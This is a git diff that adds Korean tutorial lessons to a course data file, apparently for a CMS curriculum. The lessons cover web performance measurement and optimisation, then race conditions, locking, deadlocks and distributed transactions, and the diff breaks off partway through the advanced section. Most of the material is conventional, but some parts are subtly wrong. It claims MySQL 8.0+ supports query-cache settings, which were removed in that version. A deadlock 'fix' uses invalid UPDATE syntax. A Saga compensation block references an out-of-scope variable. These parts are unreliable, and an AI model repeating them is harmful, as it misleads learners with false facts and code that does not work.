@@ -2695,7 +2695,575 @@ groups:
             'Lighthouse로 현재 점수 측정',
             '가장 느린 페이지 3개 찾기',
             '이미지 최적화 1회 실행'
-          ]
+          ],
+          content: {
+            beginner: {
+              title: "초급: 성능 문제가 무엇인지 이해하고 측정 도구 사용하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "웹사이트의 성능을 측정하고, 어디가 느린지 파악할 수 있다."
+                },
+                {
+                  heading: "1. 성능이 왜 중요한가?",
+                  content: "사용자는 3초 안에 로딩되지 않으면 페이지를 떠납니다.",
+                  list: [
+                    "로딩 시간 1초 증가 → 전환율 7% 감소",
+                    "모바일에서는 더 심각 (4G 환경)",
+                    "검색엔진 순위에도 영향 (SEO)",
+                    "서버 리소스 낭비 → 운영 비용 증가"
+                  ]
+                },
+                {
+                  heading: "2. Core Web Vitals 이해하기",
+                  content: "Google이 정의한 3가지 핵심 성능 지표:",
+                  code: `# LCP (Largest Contentful Paint)
+- 가장 큰 콘텐츠가 화면에 표시되는 시간
+- 목표: 2.5초 이내
+- 예: 메인 이미지, 큰 텍스트 블록
+
+# FID (First Input Delay)
+- 사용자가 클릭했을 때 반응하는 시간
+- 목표: 100ms 이내
+- 예: 버튼 클릭, 링크 터치
+
+# CLS (Cumulative Layout Shift)
+- 페이지 로딩 중 레이아웃이 밀리는 정도
+- 목표: 0.1 이하
+- 예: 이미지 로딩으로 텍스트가 아래로 밀림`
+                },
+                {
+                  heading: "3. Lighthouse로 성능 측정하기",
+                  steps: [
+                    {
+                      label: "Chrome DevTools 사용",
+                      code: `# 1. 크롬 브라우저에서 F12 (개발자 도구)
+# 2. Lighthouse 탭 클릭
+# 3. Categories: Performance 체크
+# 4. Device: Mobile 또는 Desktop 선택
+# 5. "Analyze page load" 버튼 클릭
+
+# 결과 확인:
+- Performance 점수 (0~100)
+- FCP (First Contentful Paint): 1.8s
+- LCP: 3.5s ← 느림! (2.5s 목표)
+- TBT (Total Blocking Time): 150ms
+- CLS: 0.05 ← 좋음!`
+                    },
+                    {
+                      label: "온라인 도구 사용",
+                      code: `# PageSpeed Insights
+https://pagespeed.web.dev/
+
+# 1. URL 입력
+# 2. 모바일/데스크톱 결과 모두 확인
+# 3. Opportunities (개선 기회) 섹션 주목
+# 4. Diagnostics (진단) 섹션에서 문제 확인`
+                    }
+                  ]
+                },
+                {
+                  heading: "4. 가장 느린 페이지 찾기",
+                  code: `// Backend에서 응답 시간 로깅 (Express.js 예시)
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = Date.now() - start;
+    if (duration > 1000) { // 1초 이상
+      console.log(\`[SLOW] \${req.method} \${req.url} - \${duration}ms\`);
+    }
+  });
+
+  next();
+});
+
+// 실제 로그 예시:
+// [SLOW] GET /api/products?page=5 - 2300ms ← 문제!
+// [SLOW] POST /api/upload - 1800ms
+// [SLOW] GET /dashboard - 1200ms`
+                },
+                {
+                  heading: "5. 이미지 최적화 - 가장 쉬운 개선",
+                  steps: [
+                    {
+                      label: "문제 확인",
+                      code: `# Lighthouse에서:
+"Properly size images" - 200KB 절약 가능
+"Serve images in modern formats" - WebP 사용 권장
+"Efficiently encode images" - 품질 최적화 필요`
+                    },
+                    {
+                      label: "온라인 도구로 최적화",
+                      code: `# TinyPNG (https://tinypng.com/)
+- PNG, JPEG 업로드
+- 자동으로 60~70% 압축
+- 품질 손실 거의 없음
+
+# 예시:
+product.jpg (500KB) → product-optimized.jpg (150KB)
+- 70% 용량 감소
+- 눈으로 차이 거의 없음`
+                    },
+                    {
+                      label: "WebP 변환 (최신 포맷)",
+                      code: `# Squoosh (https://squoosh.app/)
+1. 이미지 업로드
+2. 오른쪽에서 WebP 선택
+3. Quality: 75~85 설정
+4. 다운로드
+
+# HTML에서 사용 (구형 브라우저 대비)
+<picture>
+  <source srcset="hero.webp" type="image/webp">
+  <img src="hero.jpg" alt="Hero">
+</picture>`
+                    }
+                  ]
+                },
+                {
+                  heading: "6. 빠른 성과를 위한 체크리스트",
+                  checklist: [
+                    "모든 이미지 WebP로 변환 (또는 압축)",
+                    "이미지에 width/height 속성 추가 (CLS 방지)",
+                    "폰트 preload 설정: <link rel=\"preload\" href=\"font.woff2\" as=\"font\">",
+                    "불필요한 JavaScript 라이브러리 제거",
+                    "CSS 파일 압축 (Minify)"
+                  ]
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "현재 사이트 Lighthouse 점수 측정 후 스크린샷 저장",
+                    "가장 큰 이미지 3개 찾아서 WebP로 변환",
+                    "변환 후 다시 측정하여 점수 개선 확인",
+                    "LCP 시간이 몇 초 단축되었는지 기록"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 병목 지점 분석하고 캐싱 전략 수립하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "Chrome DevTools를 사용해 정확한 병목 지점을 찾고, 효과적인 캐싱 전략을 적용할 수 있다."
+                },
+                {
+                  heading: "1. Performance 탭으로 병목 분석",
+                  steps: [
+                    {
+                      label: "녹화 시작",
+                      code: `# Chrome DevTools → Performance 탭
+1. 빨간 점(Record) 클릭
+2. 페이지 새로고침 (Ctrl+R)
+3. 로딩 완료 후 Stop 버튼
+
+# 결과 읽기:
+- FCP (파란 선): 1.2s
+- LCP (초록 선): 3.8s ← 여기가 문제!
+- Main 섹션: JavaScript 실행 시간
+- Network 섹션: 리소스 로딩 시간`
+                    },
+                    {
+                      label: "병목 구간 확인",
+                      code: `# Main Thread 분석:
+- Evaluate Script: 800ms ← 큰 번들 파일
+- Parse HTML: 200ms
+- Layout: 150ms
+- Paint: 100ms
+
+# 결론: JavaScript 번들 최적화 필요
+- 큰 라이브러리 lazy load
+- Code splitting 적용
+- Tree shaking으로 미사용 코드 제거`
+                    }
+                  ]
+                },
+                {
+                  heading: "2. Network 탭으로 느린 요청 찾기",
+                  code: `# Chrome DevTools → Network 탭
+1. Disable cache 체크
+2. 페이지 새로고침
+3. Waterfall 차트 분석
+
+# 문제 패턴:
+┌─────────────────────────────────┐
+│ app.js       │███████████████   │ 2.5s ← 너무 큼
+│ api/products │      ████         │ 800ms ← DB 쿼리 느림
+│ hero.jpg     │  ████             │ 600ms ← 이미지 큼
+│ style.css    │██                 │ 200ms
+└─────────────────────────────────┘
+
+# 해결 방안:
+1. app.js → Code splitting으로 나누기
+2. api/products → 인덱스 추가 또는 Redis 캐싱
+3. hero.jpg → WebP + CDN 사용`
+                },
+                {
+                  heading: "3. 브라우저 캐싱 전략",
+                  code: `// Express.js에서 Cache-Control 헤더 설정
+app.use(express.static('public', {
+  maxAge: '1y', // 1년 캐싱
+  immutable: true
+}));
+
+// 정적 파일별로 다르게 설정
+app.get('/api/*', (req, res) => {
+  res.set('Cache-Control', 'no-cache'); // API는 캐시 안 함
+});
+
+app.get('/static/*', (req, res) => {
+  res.set('Cache-Control', 'public, max-age=31536000'); // 이미지/CSS/JS는 1년
+});
+
+// Nginx 설정 예시
+location ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {
+  expires 1y;
+  add_header Cache-Control "public, immutable";
+}`
+                },
+                {
+                  heading: "4. CDN 활용하기",
+                  content: "정적 파일을 CDN에 올리면 전 세계 어디서나 빠르게 로딩됩니다.",
+                  steps: [
+                    {
+                      label: "Cloudflare CDN (무료) 설정",
+                      code: `# 1. Cloudflare 계정 생성
+# 2. 도메인 추가
+# 3. 네임서버 변경
+# 4. Speed → Optimization 설정:
+   - Auto Minify: HTML, CSS, JS 체크
+   - Brotli 압축 활성화
+   - 이미지 최적화 (Polish) 활성화
+
+# 효과:
+- 서버 부하 70% 감소
+- 로딩 속도 50% 향상 (해외 사용자)
+- HTTPS 자동 적용`
+                    }
+                  ]
+                },
+                {
+                  heading: "5. Lazy Loading 구현",
+                  code: `// 이미지 Lazy Load (네이티브 방식)
+<img src="product.jpg" loading="lazy" alt="Product">
+
+// JavaScript 번들 Lazy Load (React 예시)
+import { lazy, Suspense } from 'react';
+
+const HeavyComponent = lazy(() => import('./HeavyComponent'));
+
+function App() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <HeavyComponent />
+    </Suspense>
+  );
+}
+
+// 효과:
+- 초기 번들 크기: 500KB → 200KB (60% 감소)
+- FCP: 2.5s → 1.2s (52% 개선)`
+                },
+                {
+                  heading: "6. Database 쿼리 최적화",
+                  code: `// 문제: N+1 쿼리
+products.forEach(async (product) => {
+  const category = await db.query(
+    'SELECT * FROM categories WHERE id = ?',
+    [product.category_id]
+  );
+  // 100개 상품 → 100번 쿼리
+});
+
+// 해결: JOIN으로 한 번에
+const products = await db.query(\`
+  SELECT p.*, c.name as category_name
+  FROM products p
+  LEFT JOIN categories c ON p.category_id = c.id
+\`);
+// 1번 쿼리로 해결
+
+// Redis 캐싱 추가
+const cacheKey = 'products:all';
+let products = await redis.get(cacheKey);
+
+if (!products) {
+  products = await db.query('SELECT * FROM products');
+  await redis.setex(cacheKey, 300, JSON.stringify(products)); // 5분 캐시
+}`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "Performance 탭으로 메인 스레드 병목 구간 찾아서 스크린샷",
+                    "가장 느린 API 엔드포인트 3개 찾고 응답 시간 기록",
+                    "정적 파일에 1년 캐시 헤더 설정 후 Network 탭에서 확인",
+                    "이미지 lazy loading 적용 후 LCP 개선 확인",
+                    "Cloudflare CDN 연결 후 전/후 속도 비교 (GTmetrix 사용)"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: 실시간 모니터링과 자동화된 성능 관리",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "성능을 실시간으로 모니터링하고, 자동으로 개선하는 시스템을 구축할 수 있다."
+                },
+                {
+                  heading: "1. Real User Monitoring (RUM) 구축",
+                  content: "실제 사용자의 경험을 측정하는 시스템:",
+                  code: `// Frontend에서 Core Web Vitals 측정
+import { getCLS, getFID, getLCP } from 'web-vitals';
+
+function sendToAnalytics({ name, delta, id }) {
+  fetch('/api/analytics', {
+    method: 'POST',
+    body: JSON.stringify({
+      metric: name,
+      value: delta,
+      id: id,
+      url: window.location.href,
+      userAgent: navigator.userAgent
+    }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+}
+
+getCLS(sendToAnalytics);
+getFID(sendToAnalytics);
+getLCP(sendToAnalytics);
+
+// Backend에서 저장 (MongoDB 예시)
+app.post('/api/analytics', async (req, res) => {
+  await db.collection('metrics').insertOne({
+    ...req.body,
+    timestamp: new Date()
+  });
+  res.sendStatus(200);
+});`
+                },
+                {
+                  heading: "2. Lighthouse CI 자동화",
+                  content: "Pull Request마다 자동으로 성능 점검:",
+                  code: `# .github/workflows/lighthouse.yml
+name: Lighthouse CI
+on: [pull_request]
+
+jobs:
+  lighthouse:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-node@v3
+      - run: npm ci
+      - run: npm run build
+
+      - name: Run Lighthouse CI
+        run: |
+          npm install -g @lhci/cli
+          lhci autorun
+        env:
+          LHCI_GITHUB_APP_TOKEN: \${{ secrets.LHCI_GITHUB_APP_TOKEN }}
+
+# lighthouserc.json
+{
+  "ci": {
+    "collect": {
+      "url": ["http://localhost:3000"],
+      "startServerCommand": "npm start"
+    },
+    "assert": {
+      "assertions": {
+        "categories:performance": ["error", {"minScore": 0.9}],
+        "first-contentful-paint": ["error", {"maxNumericValue": 2000}],
+        "interactive": ["error", {"maxNumericValue": 3500}]
+      }
+    }
+  }
+}
+
+# 효과: 성능 점수 90 미만이면 PR merge 차단`
+                },
+                {
+                  heading: "3. 성능 예산 (Performance Budget) 설정",
+                  code: `// webpack-bundle-analyzer로 번들 크기 모니터링
+// package.json
+{
+  "scripts": {
+    "analyze": "webpack-bundle-analyzer dist/stats.json"
+  }
+}
+
+// 번들 크기 제한 설정
+// webpack.config.js
+module.exports = {
+  performance: {
+    maxAssetSize: 244000, // 244KB
+    maxEntrypointSize: 244000,
+    hints: 'error' // 초과 시 빌드 실패
+  }
+};
+
+// 이미지 크기 자동 최적화
+// vite.config.js
+import imagemin from 'vite-plugin-imagemin';
+
+export default {
+  plugins: [
+    imagemin({
+      gifsicle: { optimizationLevel: 7 },
+      optipng: { optimizationLevel: 7 },
+      mozjpeg: { quality: 80 },
+      webp: { quality: 80 }
+    })
+  ]
+};`
+                },
+                {
+                  heading: "4. 서버 사이드 렌더링 (SSR) 최적화",
+                  code: `// Next.js에서 증분 정적 재생성 (ISR)
+export async function getStaticProps() {
+  const products = await fetchProducts();
+
+  return {
+    props: { products },
+    revalidate: 60 // 60초마다 재생성
+  };
+}
+
+// 효과:
+// 1. 초기 로딩: HTML이 즉시 표시 (LCP 0.8s)
+// 2. 캐시: 60초 동안 정적 파일 제공
+// 3. 업데이트: 백그라운드에서 자동 재생성
+
+// Edge Functions로 지역별 최적화
+export const config = {
+  runtime: 'edge'
+};
+
+export default async function handler(req) {
+  const country = req.geo.country;
+  const products = await getProductsByCountry(country);
+
+  return new Response(JSON.stringify(products), {
+    headers: {
+      'Cache-Control': 's-maxage=3600, stale-while-revalidate'
+    }
+  });
+}`
+                },
+                {
+                  heading: "5. Database 연결 풀링과 쿼리 캐싱",
+                  code: `// MySQL 연결 풀 최적화
+const pool = mysql.createPool({
+  host: 'localhost',
+  user: 'root',
+  password: 'password',
+  database: 'cms',
+  connectionLimit: 20, // 최대 20개 연결
+  queueLimit: 0,
+  waitForConnections: true,
+  enableKeepAlive: true,
+  keepAliveInitialDelay: 0
+});
+
+// Query Result Caching (MySQL 8.0+)
+SET GLOBAL query_cache_type = ON;
+SET GLOBAL query_cache_size = 67108864; // 64MB
+
+// 또는 Application Level Caching
+const NodeCache = require('node-cache');
+const cache = new NodeCache({ stdTTL: 600 }); // 10분
+
+app.get('/api/products', async (req, res) => {
+  const cacheKey = \`products_\${req.query.page}\`;
+
+  let data = cache.get(cacheKey);
+  if (data) {
+    return res.json({ data, cached: true });
+  }
+
+  data = await pool.query('SELECT * FROM products LIMIT ?, 20', [offset]);
+  cache.set(cacheKey, data);
+
+  res.json({ data, cached: false });
+});`
+                },
+                {
+                  heading: "6. APM (Application Performance Monitoring) 도구",
+                  steps: [
+                    {
+                      label: "New Relic 설정 (무료 플랜)",
+                      code: `# 1. New Relic 계정 생성
+# 2. Node.js 에이전트 설치
+npm install newrelic
+
+# 3. newrelic.js 설정
+exports.config = {
+  app_name: ['My CMS'],
+  license_key: 'YOUR_LICENSE_KEY',
+  logging: {
+    level: 'info'
+  }
+};
+
+# 4. 앱 시작 시 로드
+// index.js 최상단
+require('newrelic');
+const express = require('express');
+
+# 모니터링 가능:
+- 응답 시간 분포 (p50, p95, p99)
+- 느린 트랜잭션 자동 탐지
+- DB 쿼리 성능 추적
+- 에러율 및 스택 트레이스`
+                    },
+                    {
+                      label: "Sentry로 성능 모니터링",
+                      code: `import * as Sentry from '@sentry/node';
+
+Sentry.init({
+  dsn: 'YOUR_DSN',
+  tracesSampleRate: 0.1, // 10% 트랜잭션 추적
+  integrations: [
+    new Sentry.Integrations.Http({ tracing: true }),
+    new Sentry.Integrations.Express({ app })
+  ]
+});
+
+// 느린 API 자동 감지
+app.use(Sentry.Handlers.requestHandler());
+app.use(Sentry.Handlers.tracingHandler());
+
+// 커스텀 성능 측정
+const transaction = Sentry.startTransaction({
+  op: 'db.query',
+  name: 'Fetch Products'
+});
+
+const products = await db.query('SELECT * FROM products');
+
+transaction.finish();`
+                    }
+                  ]
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "web-vitals 라이브러리로 RUM 구축 후 7일간 데이터 수집",
+                    "Lighthouse CI를 GitHub Actions에 통합하여 자동 점검",
+                    "번들 크기 200KB 이하로 제한하고 초과 시 빌드 실패 설정",
+                    "Next.js ISR 또는 SSR 적용 후 LCP 2초 이내 달성",
+                    "New Relic 또는 Sentry 연동 후 p95 응답 시간 500ms 이하 유지"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '3-2',
@@ -2707,7 +3275,823 @@ groups:
             '2개 브라우저로 동시 수정 테스트',
             '충돌 상황 재현',
             '간단한 잠금 메커니즘 구현'
-          ]
+          ],
+          content: {
+            beginner: {
+              title: "초급: Race Condition이 무엇인지 이해하고 문제 재현하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "동시성 문제가 무엇인지 이해하고, 실제로 문제를 재현해볼 수 있다."
+                },
+                {
+                  heading: "1. Race Condition이란?",
+                  content: "여러 사용자가 동시에 같은 데이터를 수정할 때 발생하는 문제입니다.",
+                  code: `# 시나리오: 재고 10개인 상품을 두 명이 동시 구매
+시간  |  사용자A          |  사용자B          |  실제 재고
+-----|------------------|------------------|----------
+1초   | 재고 확인 (10개) |                  | 10
+2초   | 1개 구매 결정    | 재고 확인 (10개) | 10
+3초   | 재고 = 10-1 = 9  | 1개 구매 결정    | 10
+4초   | 저장 (9개)       | 재고 = 10-1 = 9  | 9
+5초   |                  | 저장 (9개)       | 9 ← 버그!
+
+# 문제: 2개 팔렸는데 재고는 1개만 줄어듦
+# 원인: 두 사용자가 같은 초기값(10)을 읽었기 때문`
+                },
+                {
+                  heading: "2. 실제 발생하는 문제 사례",
+                  list: [
+                    "이커머스: 재고 10개인데 15명이 구매 성공 → 마이너스 재고",
+                    "은행 앱: 잔액 1만원인데 동시 출금으로 2만원 인출",
+                    "좋아요 기능: 100개였는데 동시 클릭으로 101이 아닌 99로 변경",
+                    "게시글 조회수: 정확하지 않은 카운팅"
+                  ]
+                },
+                {
+                  heading: "3. 문제 재현하기 (브라우저 2개)",
+                  steps: [
+                    {
+                      label: "테스트 페이지 준비",
+                      code: `<!-- test-race.html -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>재고 관리 테스트</h1>
+  <p>현재 재고: <span id="stock">10</span>개</p>
+  <button onclick="buyProduct()">구매하기 (1개)</button>
+
+  <script>
+    async function buyProduct() {
+      // 1. 현재 재고 읽기
+      const response = await fetch('/api/stock');
+      const { stock } = await response.json();
+
+      console.log('현재 재고:', stock);
+
+      // 2. 1초 대기 (동시 실행 시뮬레이션)
+      await new Promise(r => setTimeout(r, 1000));
+
+      // 3. 재고 감소시켜서 저장
+      await fetch('/api/stock', {
+        method: 'PUT',
+        body: JSON.stringify({ stock: stock - 1 }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+
+      // 4. 화면 업데이트
+      document.getElementById('stock').textContent = stock - 1;
+    }
+  </script>
+</body>
+</html>`
+                    },
+                    {
+                      label: "백엔드 API (Express.js)",
+                      code: `let stock = 10; // 초기 재고
+
+app.get('/api/stock', (req, res) => {
+  res.json({ stock });
+});
+
+app.put('/api/stock', (req, res) => {
+  stock = req.body.stock;
+  console.log('재고 업데이트:', stock);
+  res.json({ stock });
+});`
+                    },
+                    {
+                      label: "재현 방법",
+                      code: `1. 브라우저 2개 열기 (Chrome, Edge 또는 시크릿 모드)
+2. 양쪽 모두 http://localhost:3000/test-race.html 접속
+3. 동시에 "구매하기" 버튼 클릭 (0.5초 차이 내)
+
+# 예상 결과: 재고 8개 (10 - 1 - 1)
+# 실제 결과: 재고 9개 (버그!)
+
+# 로그:
+[브라우저A] 현재 재고: 10
+[브라우저B] 현재 재고: 10
+[서버] 재고 업데이트: 9
+[서버] 재고 업데이트: 9 ← 문제 발생!`
+                    }
+                  ]
+                },
+                {
+                  heading: "4. 간단한 해결책: Optimistic Locking (낙관적 잠금)",
+                  code: `// 버전 번호를 추가
+let stock = 10;
+let version = 1;
+
+app.put('/api/stock', (req, res) => {
+  const { newStock, clientVersion } = req.body;
+
+  // 버전이 다르면 실패
+  if (clientVersion !== version) {
+    return res.status(409).json({
+      error: '다른 사용자가 먼저 수정했습니다. 새로고침 후 다시 시도하세요.'
+    });
+  }
+
+  // 버전이 같으면 업데이트
+  stock = newStock;
+  version++; // 버전 증가
+  res.json({ stock, version });
+});
+
+// Frontend 수정
+async function buyProduct() {
+  const { stock, version } = await fetch('/api/stock').then(r => r.json());
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  const response = await fetch('/api/stock', {
+    method: 'PUT',
+    body: JSON.stringify({
+      newStock: stock - 1,
+      clientVersion: version // 버전 포함
+    }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+
+  if (response.status === 409) {
+    alert('다른 사용자가 먼저 구매했습니다. 다시 시도해주세요.');
+    location.reload();
+  }
+}`
+                },
+                {
+                  heading: "5. MySQL에서 Optimistic Locking",
+                  code: `-- 테이블에 version 컬럼 추가
+ALTER TABLE products ADD COLUMN version INT DEFAULT 1;
+
+-- 업데이트 쿼리 (버전 체크)
+UPDATE products
+SET stock = stock - 1,
+    version = version + 1
+WHERE id = 123
+  AND version = ?; -- 클라이언트가 읽은 버전
+
+-- 결과:
+-- affected rows = 1: 성공
+-- affected rows = 0: 실패 (다른 사용자가 먼저 수정함)`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "위 HTML 파일로 Race Condition 재현 후 스크린샷",
+                    "브라우저 개발자 도구 Console에서 로그 확인",
+                    "Optimistic Locking 적용 후 다시 테스트",
+                    "충돌 시 에러 메시지 표시되는지 확인"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 데이터베이스 잠금과 트랜잭션으로 해결하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "데이터베이스 잠금 메커니즘과 트랜잭션 격리 수준을 이해하고 적용할 수 있다."
+                },
+                {
+                  heading: "1. Pessimistic Locking (비관적 잠금)",
+                  content: "데이터를 읽을 때 미리 잠금을 걸어서 다른 사용자의 접근을 차단합니다.",
+                  code: `// MySQL에서 FOR UPDATE 사용
+START TRANSACTION;
+
+SELECT stock FROM products
+WHERE id = 123
+FOR UPDATE; -- 이 행을 잠금 (다른 트랜잭션은 대기)
+
+-- stock이 10이라고 가정
+UPDATE products
+SET stock = 10 - 1
+WHERE id = 123;
+
+COMMIT; -- 잠금 해제
+
+// Node.js 구현
+app.post('/api/purchase', async (req, res) => {
+  const connection = await pool.getConnection();
+
+  try {
+    await connection.beginTransaction();
+
+    // 1. 잠금을 걸고 재고 조회
+    const [rows] = await connection.query(
+      'SELECT stock FROM products WHERE id = ? FOR UPDATE',
+      [req.body.productId]
+    );
+
+    const currentStock = rows[0].stock;
+
+    if (currentStock < 1) {
+      throw new Error('재고 부족');
+    }
+
+    // 2. 재고 감소
+    await connection.query(
+      'UPDATE products SET stock = stock - 1 WHERE id = ?',
+      [req.body.productId]
+    );
+
+    await connection.commit();
+    res.json({ success: true, remainingStock: currentStock - 1 });
+
+  } catch (error) {
+    await connection.rollback();
+    res.status(400).json({ error: error.message });
+  } finally {
+    connection.release();
+  }
+});`
+                },
+                {
+                  heading: "2. 트랜잭션 격리 수준 (Isolation Level)",
+                  code: `# MySQL 격리 수준 4단계
+
+# 1. READ UNCOMMITTED (커밋 안 된 데이터도 읽음)
+- 문제: Dirty Read (롤백될 데이터 읽음)
+- 사용: 거의 안 함
+
+# 2. READ COMMITTED (커밋된 데이터만 읽음)
+- 문제: Non-repeatable Read (같은 쿼리가 다른 결과)
+- 사용: PostgreSQL 기본값
+
+# 3. REPEATABLE READ (같은 트랜잭션 내 일관된 읽기)
+- 문제: Phantom Read (새로운 행 추가 감지 못함)
+- 사용: MySQL 기본값 ← 대부분 이걸 사용
+
+# 4. SERIALIZABLE (완전 격리)
+- 문제: 성능 저하 (순차 실행)
+- 사용: 금융권 중요 거래
+
+-- 설정 방법
+SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;
+
+-- 현재 설정 확인
+SELECT @@transaction_isolation;`
+                },
+                {
+                  heading: "3. Deadlock (교착 상태) 이해하고 해결하기",
+                  code: `# Deadlock 발생 시나리오
+
+시간 | 트랜잭션 A                    | 트랜잭션 B
+-----|------------------------------|-----------------------------
+1초  | SELECT * FROM orders WHERE id=1 FOR UPDATE |
+2초  |                              | SELECT * FROM orders WHERE id=2 FOR UPDATE
+3초  | SELECT * FROM orders WHERE id=2 FOR UPDATE (대기) |
+4초  |                              | SELECT * FROM orders WHERE id=1 FOR UPDATE (대기)
+5초  | [Deadlock 발생!]             | [Deadlock 발생!]
+
+-- MySQL은 자동으로 하나를 롤백:
+ERROR 1213: Deadlock found when trying to get lock
+
+# 해결 방법 1: 항상 같은 순서로 잠금
+// Bad (교착 상태 가능)
+UPDATE orders WHERE id = 2;
+UPDATE orders WHERE id = 1;
+
+// Good (ID 순서대로)
+UPDATE orders WHERE id IN (1, 2) ORDER BY id;
+
+# 해결 방법 2: 잠금 타임아웃 설정
+SET SESSION innodb_lock_wait_timeout = 5; -- 5초 대기 후 실패
+
+# 해결 방법 3: 재시도 로직
+async function updateWithRetry(query, maxRetries = 3) {
+  for (let i = 0; i < maxRetries; i++) {
+    try {
+      return await db.query(query);
+    } catch (error) {
+      if (error.code === 'ER_LOCK_DEADLOCK' && i < maxRetries - 1) {
+        await new Promise(r => setTimeout(r, 100 * (i + 1))); // 지수 백오프
+        continue;
+      }
+      throw error;
+    }
+  }
+}`
+                },
+                {
+                  heading: "4. Redis를 이용한 분산 잠금",
+                  content: "여러 서버가 있을 때는 Redis로 잠금을 관리합니다.",
+                  code: `const Redis = require('ioredis');
+const redis = new Redis();
+
+// Redlock 알고리즘 구현
+async function acquireLock(key, ttl = 5000) {
+  const lockKey = \`lock:\${key}\`;
+  const lockValue = Date.now() + ttl;
+
+  // SET NX: 키가 없을 때만 설정
+  const result = await redis.set(
+    lockKey,
+    lockValue,
+    'PX', ttl, // milliseconds
+    'NX'       // Not eXists
+  );
+
+  return result === 'OK';
+}
+
+async function releaseLock(key) {
+  await redis.del(\`lock:\${key}\`);
+}
+
+// 사용 예시
+app.post('/api/purchase', async (req, res) => {
+  const productId = req.body.productId;
+  const lockKey = \`product:\${productId}\`;
+
+  // 1. 잠금 시도
+  const locked = await acquireLock(lockKey, 3000);
+
+  if (!locked) {
+    return res.status(409).json({
+      error: '다른 사용자가 처리 중입니다. 잠시 후 다시 시도해주세요.'
+    });
+  }
+
+  try {
+    // 2. 재고 확인 및 차감
+    const stock = await db.query(
+      'SELECT stock FROM products WHERE id = ?',
+      [productId]
+    );
+
+    if (stock[0].stock < 1) {
+      throw new Error('재고 부족');
+    }
+
+    await db.query(
+      'UPDATE products SET stock = stock - 1 WHERE id = ?',
+      [productId]
+    );
+
+    res.json({ success: true });
+
+  } finally {
+    // 3. 잠금 해제
+    await releaseLock(lockKey);
+  }
+});`
+                },
+                {
+                  heading: "5. 실전: 선착순 이벤트 구현",
+                  code: `// 문제: 100명 한정 쿠폰을 1000명이 동시 요청
+// 해결: Redis INCR (원자적 연산)
+
+app.post('/api/coupon/claim', async (req, res) => {
+  const eventId = req.body.eventId;
+  const userId = req.user.id;
+  const key = \`event:\${eventId}:count\`;
+
+  // 1. 원자적으로 카운트 증가
+  const count = await redis.incr(key);
+
+  // 2. 100명 초과 시 실패
+  if (count > 100) {
+    return res.status(410).json({
+      error: '마감되었습니다.'
+    });
+  }
+
+  // 3. 쿠폰 발급
+  await db.query(
+    'INSERT INTO coupons (event_id, user_id) VALUES (?, ?)',
+    [eventId, userId]
+  );
+
+  res.json({
+    success: true,
+    yourNumber: count // 몇 번째 당첨자인지
+  });
+});
+
+// TTL 설정 (24시간 후 자동 삭제)
+await redis.expire(\`event:\${eventId}:count\`, 86400);`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "FOR UPDATE로 Pessimistic Locking 구현 후 동시 요청 테스트",
+                    "Deadlock 의도적으로 발생시키고 에러 로그 확인",
+                    "Redis 분산 잠금으로 선착순 이벤트 구현 (100명 한정)",
+                    "Apache Bench로 동시 요청 1000개 보내서 정확히 100명만 성공하는지 확인",
+                    "트랜잭션 격리 수준 변경 후 동작 차이 테스트"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: 분산 시스템에서의 동시성 제어와 이벤트 소싱",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "분산 환경에서 동시성을 제어하고, 이벤트 소싱 패턴을 이해할 수 있다."
+                },
+                {
+                  heading: "1. 분산 트랜잭션 (2PC - Two Phase Commit)",
+                  content: "여러 데이터베이스에 걸친 트랜잭션을 안전하게 처리하는 방법:",
+                  code: `// 문제: 주문 DB와 재고 DB가 분리된 경우
+// 주문은 성공했는데 재고 차감 실패 → 데이터 불일치
+
+// 2단계 커밋 프로토콜
+class DistributedTransaction {
+  async execute() {
+    const participants = [orderDB, inventoryDB, paymentDB];
+
+    // Phase 1: Prepare (준비 단계)
+    try {
+      for (const db of participants) {
+        await db.prepare(); // 트랜잭션 시작, 잠금 획득
+      }
+    } catch (error) {
+      // 하나라도 실패하면 모두 롤백
+      for (const db of participants) {
+        await db.rollback();
+      }
+      throw error;
+    }
+
+    // Phase 2: Commit (커밋 단계)
+    try {
+      for (const db of participants) {
+        await db.commit();
+      }
+    } catch (error) {
+      // 치명적 오류: 수동 복구 필요
+      console.error('Commit failed:', error);
+      // 보상 트랜잭션 실행
+    }
+  }
+}
+
+// 실제 구현 (Saga 패턴)
+async function createOrder(orderData) {
+  const sagaId = uuid();
+
+  try {
+    // 1. 주문 생성
+    const order = await orderDB.create(orderData);
+
+    // 2. 재고 차감
+    await inventoryDB.decreaseStock(order.productId, order.quantity);
+
+    // 3. 결제 처리
+    await paymentDB.charge(order.userId, order.amount);
+
+    return order;
+
+  } catch (error) {
+    // 보상 트랜잭션 (Compensating Transaction)
+    await orderDB.cancel(order.id);
+    await inventoryDB.increaseStock(order.productId, order.quantity);
+    // 결제는 아직 안 했으므로 보상 불필요
+
+    throw error;
+  }
+}`
+                },
+                {
